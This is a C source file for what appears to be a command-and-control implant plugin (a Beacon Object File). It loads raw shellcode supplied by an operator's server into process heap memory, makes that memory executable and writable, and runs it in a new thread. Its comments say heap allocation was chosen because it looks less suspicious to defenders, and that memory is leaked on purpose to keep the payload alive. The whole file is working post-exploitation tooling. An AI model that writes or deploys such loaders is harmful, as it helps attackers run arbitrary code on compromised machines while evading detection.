/*
 * shellcode_exec_heap.c - Shellcode execution using HeapAlloc.
 *
 * Allocates memory from process heap and executes shellcode.
 * Less suspicious than VirtualAlloc as heap allocations are common.
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c shellcode_exec_heap.c -o shellcode_exec_heap.o
 *
 * Usage from server:
 *   Upload shellcode_exec_heap.o, set args = raw shellcode bytes
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

#define HEAP_ZERO_MEMORY_VAL 0x00000008
#define PAGE_EXECUTE_READWRITE_VAL 0x40

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

void go(char* args, int alen)
{
    char* shellcode_data = NULL;
    int shellcode_len = 0;

    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        shellcode_data = BeaconDataExtract(&parser, &shellcode_len);
    }

    if (shellcode_data == NULL || shellcode_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No shellcode provided\n", 21);
        return;
    }

    if (shellcode_len > 10 * 1024 * 1024) {
        BeaconOutput(CALLBACK_ERROR, "Shellcode too large (max 10MB)\n", 32);
        return;
    }

    /* Allocate from process heap */
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    if (!hHeap) {
        BeaconOutput(CALLBACK_ERROR, "GetProcessHeap failed\n", 22);
        return;
    }

    LPVOID heap_mem = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY_VAL, shellcode_len);
    if (!heap_mem) {
        BeaconOutput(CALLBACK_ERROR, "HeapAlloc failed\n", 17);
        return;
    }

    /* Copy shellcode */
    bof_memcpy(heap_mem, shellcode_data, shellcode_len);

    /* Change protection to executable + writable (needed for self-modifying shellcode) */
    DWORD old_protect;
    if (!KERNEL32$VirtualProtect(heap_mem, shellcode_len, PAGE_EXECUTE_READWRITE_VAL, &old_protect)) {
        BeaconOutput(CALLBACK_ERROR, "VirtualProtect failed\n", 22);
        KERNEL32$HeapFree(hHeap, 0, heap_mem);
        return;
    }

    /* Execute in thread */
    HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)heap_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        BeaconOutput(CALLBACK_ERROR, "CreateThread failed\n", 20);
        KERNEL32$HeapFree(hHeap, 0, heap_mem);
        return;
    }

    /* Don't close handle or free memory - keep everything alive */
    /* Thread handle leak is intentional to prevent premature termination */
    BeaconOutput(CALLBACK_OUTPUT, "Shellcode thread started (HeapAlloc)\n", 38);

    /* Note: Memory and handle are intentionally leaked */
}
